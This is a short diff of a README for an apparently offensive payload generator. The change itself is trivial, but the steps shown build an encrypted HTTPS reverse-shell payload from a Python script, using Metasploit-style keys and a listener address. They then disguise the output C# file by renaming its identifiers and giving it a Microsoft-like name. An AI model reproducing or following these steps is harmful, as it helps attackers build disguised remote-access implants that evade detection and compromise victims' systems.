@@ -13,7 +13,7 @@ After installing Letsencrypt you need to combine 2 keys to use for the reverse h
 cat privkey.pem cert.pem >> msfkey.pem
  
 2. run the python script:
-python mod_nice.py -a x64 -P https -l <listener address> -p 443 -e aes256 -k test123 -ssl /path/msfkey.pem -s
+python mod_nice.py -a x64 -P https -l (listener address) -p 443 -e aes256 -k test123 -ssl /path/msfkey.pem -s
  
 3. The script outputs a cs template called mmniceness.cs. Find and replace all function names and variables, etc. I also renamed it to sound like some Microsoft kind of thing, like msvct.cs.
  
